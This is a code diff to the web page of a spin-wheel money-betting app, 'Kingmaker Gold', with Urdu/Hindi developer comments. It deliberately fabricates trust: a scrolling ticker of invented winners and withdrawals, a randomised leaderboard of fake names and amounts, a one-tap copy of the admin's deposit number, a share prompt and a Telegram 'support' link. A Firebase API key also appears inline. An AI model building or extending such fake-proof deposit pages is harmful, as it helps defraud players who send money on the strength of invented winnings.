@@ -9,7 +9,7 @@
 <style>
 body{background:#05070a;color:#fff;font-family:sans-serif;margin:0;padding:16px;text-align:center}
 
-/* 1. FAKE TICKER PATTI - NAYI CHEEZ */
+/* 1. FAKE TICKER PATTI */
 #winTicker{background:#000;border-bottom:2px solid #ffd700;padding:8px 0;overflow:hidden;white-space:nowrap;margin:-16px -16px 16px -16px}
 #tickerContent{display:inline-block;animation:scroll 40s linear infinite;color:#10b981;font-weight:700;font-size:13px}
 @keyframes scroll{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
@@ -17,7 +17,7 @@ body{background:#05070a;color:#fff;font-family:sans-serif;margin:0;padding:16px;
 .hdr{background:#0b1018;padding:16px;border-radius:16px;display:flex;justify-content:space-between;margin-bottom:20px;align-items:center}
 .bal{font-size:24px;font-weight:900;color:#ffd700}
 
-/* 2. LEADERBOARD TOP 10 - NAYI CHEEZ */
+/* 2. LEADERBOARD TOP 10 */
 .leaderBox{background:#0b1018;border:2px solid #ffd700;border-radius:12px;margin-bottom:20px;padding:12px}
 .leaderTitle{text-align:center;color:#ffd700;font-size:16px;font-weight:900;margin-bottom:10px}
 .top1{background:linear-gradient(45deg,#ffd700,#ff8c00);color:#000;padding:12px;border-radius:8px;margin-bottom:10px;text-align:center;font-weight:900}
@@ -40,14 +40,12 @@ canvas{width:100%;height:100%;border-radius:50%;border:8px solid #0d1117;transit
 .btn{background:#0b1018;border:1px solid #b8860b;color:#fff;padding:16px;border-radius:12px;cursor:pointer;font-weight:700}
 .box{background:#0b1018;border:1px solid #b8860b;padding:15px;border-radius:12px;margin:15px 0}
 .num-display{background:#000;border:2px solid #10b981;padding:12px;border-radius:8px;color:#10b981;font-weight:900;font-size:18px;margin:10px 0;box-shadow:0 0 15px rgba(16,185,129,0.3)}
-
-/* 3. DEPOSIT INFO BOX - NAYI CHEEZ */
 .depositInfoBox{background:#0b1018;border:1px solid #10b981;padding:15px;border-radius:12px;margin:15px 0}
 </style>
 </head>
 <body>
 
-<!-- 1. FAKE WITHDRAWAL TICKER - NAYI CHEEZ -->
+<!-- 1. FAKE WITHDRAWAL TICKER -->
 <div id="winTicker">
   <div id="tickerContent"></div>
 </div>
@@ -61,7 +59,7 @@ canvas{width:100%;height:100%;border-radius:50%;border:8px solid #0d1117;transit
 <button onclick="logout()" style="background:#ef4444;color:#fff;border:none;padding:8px 16px;border-radius:8px;font-weight:700">LOGOUT</button>
 </div>
 
-<!-- 2. LEADERBOARD TOP 10 - NAYI CHEEZ -->
+<!-- 2. LEADERBOARD TOP 10 -->
 <div class="leaderBox">
   <div class="leaderTitle">🏆 TODAY'S TOP WINNERS 🏆</div>
   <div class="top1">
@@ -72,10 +70,11 @@ canvas{width:100%;height:100%;border-radius:50%;border:8px solid #0d1117;transit
   <div id="top10List"></div>
 </div>
 
-<!-- 3. DEPOSIT INFO - NAYI CHEEZ - [object Object] FIX -->
+<!-- 3. DEPOSIT INFO - FIXED -->
 <div class="depositInfoBox">
 <h3>💰 Deposit Info</h3>
 <div class="num-display" id="adminDepositInfo">Loading...</div>
+<button onclick="copyDeposit()" style="background:#10b981;margin-top:10px;width:100%;padding:10px;border:none;border-radius:8px;color:#000;font-weight:900">📋 COPY NUMBER</button>
 </div>
 
 <div class="box">
@@ -101,7 +100,13 @@ BET: <input type="number" id="bet" value="10" min="1">
 
 <div class="grid">
 <button class="btn" onclick="location.href='./wallet.html'">💰 WALLET</button>
-<button class="btn" onclick="Swal.fire('KYC','Coming Soon','info')">🆔 KYC</button>
+<!-- SHARE BUTTON WAPAS AA GAYA -->
+<button class="btn" onclick="shareApp()">📤 SHARE</button>
+</div>
+
+<!-- CUSTOMER SUPPORT BUTTON - TELEGRAM LINK YAHAN DALNA -->
+<div style="margin-top:20px">
+<button onclick="openTelegram()" style="width:100%;background:#0088cc;color:#fff;padding:16px;border:none;border-radius:12px;font-weight:900;font-size:16px">💬 CUSTOMER SUPPORT</button>
 </div>
 
 <script type="module">
@@ -113,7 +118,11 @@ const app=initializeApp({apiKey:"AIzaSyBBperRVYyxnUITX92tuS8MSU5A-JKqCsM",authDo
 const auth=getAuth(app),db=getDatabase(app);
 const segs=["2","100","5","5","1000","5000","20","1000"];
 const c=document.getElementById("w"),ctx=c.getContext("2d"),resultBox=document.getElementById("resultBox");
-let rot=0,ub=0,safe=false;
+let rot=0,ub=0,safe=false,adminPaymentData=null;
+
+// YAHAN APNA TELEGRAM LINK DALNA JAANU
+const TELEGRAM_SUPPORT_LINK = "https://t.me/YourUsername"; // ← YE BADAL DENA
+const TELEGRAM_GROUP_LINK = "https://t.me/YourGroupLink"; // ← YE BHI BADAL DENA
 
 function drawWheel(showNumbers=true){
 ctx.clearRect(0,0,500,500);
@@ -125,7 +134,6 @@ ctx.moveTo(0,0);ctx.arc(0,0,250,s,e);ctx.fill();
 ctx.strokeStyle="#b8860b";ctx.lineWidth=2;ctx.stroke();
 if(showNumbers){
 ctx.save();ctx.rotate(((i+0.5)*45-90)*Math.PI/180);
-// Wheel ke numbers ab Blue hain - aankh ko achhe lagenge
 ctx.fillStyle="#00d4ff";ctx.shadowColor="#00d4ff";ctx.shadowBlur=10;
 ctx.font="900 36px sans-serif";ctx.textAlign="center";ctx.fillText(segs[i],160,0);
 ctx.restore();
@@ -146,25 +154,24 @@ document.getElementById("myNum").value=n==="Not Set"?"":n;
 onValue(ref(db,'admin/safe_mode'),s=>safe=s.val()===true);
 });
 
-// NAYI CHEEZ 1: DEPOSIT INFO FIX - [object Object] solve
+// DEPOSIT INFO FIX - OBJECT OBJECT KHATAM
 onValue(ref(db,'admin/payment_info'),s=>{
-  let d=s.val();
-  if(d&&d.type){
-    document.getElementById('adminDepositInfo').innerHTML=`${d.type}: <b>${d.number}</b><br>Name: <b>${d.name}</b>`;
+  adminPaymentData=s.val();
+  if(adminPaymentData&&adminPaymentData.type){
+    document.getElementById('adminDepositInfo').innerHTML=`${adminPaymentData.type}: <b>${adminPaymentData.number}</b><br>Name: <b>${adminPaymentData.name}</b>`;
   }else{
     document.getElementById('adminDepositInfo').innerText='Payment info not set by admin';
   }
 });
 
-// NAYI CHEEZ 2: FAKE WITHDRAWAL TICKER
-const fakeWins=["🔥 Ali 🇵🇰 ne 15,000 PKR jeete!","💰 Fatima 🇸🇦 ne 8,500 PKR withdraw kiye!","🚀 John 🇺🇸 ne 50,000 PKR ka Cash Out!","💎 Ayesha 🇦🇪 ne 22,300 PKR jeete!","⚡ Usman 🇵🇰 ne 1,20,000 PKR withdraw kiye!","👑 Sarah 🇬🇧 ne 45,000 PKR ka Jackpot!","🎯 Ahmed 🇶🇦 ne 9,800 PKR jeete!","💵 Maria 🇹🇷 ne 67,000 PKR withdraw kiye!"];
+// FAKE TICKER
+const fakeWins=["🔥 Ali 🇵🇰 ne 15,000 PKR jeete!","💰 Fatima 🇸🇦 ne 8,500 PKR withdraw kiye!","🚀 John 🇺🇸 ne 50,000 PKR ka Cash Out!","💎 Ayesha 🇦🇪 ne 22,300 PKR jeete!","⚡ Usman 🇵🇰 ne 1,20,000 PKR withdraw kiye!","👑 Sarah 🇬🇧 ne 45,000 PKR ka Jackpot!"];
 document.getElementById('tickerContent').innerHTML=fakeWins.join(" &nbsp;&nbsp;●&nbsp;&nbsp; ")+" &nbsp;&nbsp;●&nbsp;&nbsp; "+fakeWins.join(" &nbsp;&nbsp;●&nbsp;&nbsp; ");
 
-// NAYI CHEEZ 3: FAKE LEADERBOARD
+// LEADERBOARD
 const fakeNames=["Ali Khan","Sara Ahmed","Usman Ali","Fatima Noor","Ahmed Raza","Ayesha Malik","Bilal Shah","Zara Sheikh","Hassan Jan","John Smith"];
 const flags=["🇵🇰","🇸🇦","🇦🇪","🇺🇸","🇬🇧","🇹🇷","🇶🇦","🇮🇳","🇧🇩","🇨🇳"];
 const amounts=[150000,120000,98000,85000,67000,50000,45000,32000,25000,18000];
-
 function updateLeaderboard(){
   document.getElementById('todayDate').innerText=new Date().toLocaleDateString('en-GB',{day:'numeric',month:'long',year:'numeric'});
   let top1Name=fakeNames[Math.floor(Math.random()*fakeNames.length)];
@@ -190,6 +197,33 @@ let n=document.getElementById('myNum').value.trim();
 if(!n)return Swal.fire("Error","Number daalo","error");
 await update(ref(db,`users/${auth.currentUser.uid}`),{withdraw_number:n});
 Swal.fire("Saved!","Number save ho gaya","success");
+};
+
+// SHARE BUTTON WAPAS AA GAYA
+window.shareApp=()=>{
+  if(navigator.share){
+    navigator.share({
+      title:'Kingmaker Gold',
+      text:'Aao khelo aur paisa jeeto! 🎡💰',
+      url:window.location.href
+    });
+  }else{
+    navigator.clipboard.writeText(window.location.href);
+    Swal.fire("Copied!","Link copy ho gaya. Doston ko bhejo","success");
+  }
+};
+
+// COPY DEPOSIT NUMBER
+window.copyDeposit=()=>{
+  if(adminPaymentData&&adminPaymentData.number){
+    navigator.clipboard.writeText(adminPaymentData.number);
+    Swal.fire("Copied!",`Number ${adminPaymentData.number} copy ho gaya`,"success");
+  }
+};
+
+// TELEGRAM SUPPORT
+window.openTelegram=()=>{
+  window.open(TELEGRAM_SUPPORT_LINK,'_blank');
 };
 
 document.getElementById("spinBtn").onclick=async function(){
@@ -227,7 +261,6 @@ drawWheel(true);
 resultBox.innerText=winAmount;
 resultBox.style.display='block';
 
-// PHOOL/CONFETTI - MAZA AA JAYEGA
 confetti({
   particleCount:150,
   spread:100,
@@ -247,4 +280,4 @@ this.disabled=false;this.innerText="SPIN NOW";
 };
 </script>
 </body>
-</html>
+  </html>
